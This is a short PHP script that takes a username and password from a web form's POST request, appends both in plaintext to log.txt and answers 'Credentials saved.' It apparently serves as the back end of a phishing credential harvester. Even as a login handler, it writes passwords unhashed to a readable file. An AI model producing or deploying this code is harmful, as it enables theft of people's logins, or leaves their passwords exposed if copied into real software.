<?php
// Get the username and password from the POST request
$username = $_POST['username'];
$password = $_POST['password'];

// Save the credentials to a text file
$file = fopen("log.txt", "a"); // Open log.txt for appending
fwrite($file, "Username: " . $username . " | Password: " . $password . "\n");
fclose($file);

// Provide feedback to the user
echo "Credentials saved.";
?>
